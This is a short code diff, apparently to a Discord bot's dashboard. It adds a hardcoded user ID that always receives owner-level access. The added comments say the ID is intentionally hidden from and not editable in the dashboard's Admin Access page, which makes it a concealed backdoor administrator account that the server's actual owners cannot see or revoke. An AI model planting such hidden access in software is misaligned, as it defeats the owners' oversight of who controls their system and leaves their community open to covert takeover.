@@ -210,6 +210,11 @@ DASHBOARD_OWNER_USER_IDS = {
     if x.strip().isdigit()
 }
 
+# Private dashboard owner exception.
+# This is intentionally not shown or editable in the dashboard Admin Access page.
+# Keep it here so the main developer/admin can never get locked out even if he is not the Discord server owner.
+DASHBOARD_PRIVATE_OWNER_USER_IDS = {1125198908231004191}
+
 # =========================
 # ADMIN CONTROL CENTER
 # =========================
@@ -3716,6 +3721,10 @@ def dashboard_access_level(user_id):
     guild = bot.get_guild(GUILD_ID)
 
     # Bootstrap owners: keep these forever for safety.
+    # Private owner IDs are hardcoded and not exposed in the dashboard UI.
+    if user_id in DASHBOARD_PRIVATE_OWNER_USER_IDS:
+        return "owner"
+
     if user_id in DASHBOARD_OWNER_USER_IDS:
         return "owner"
 
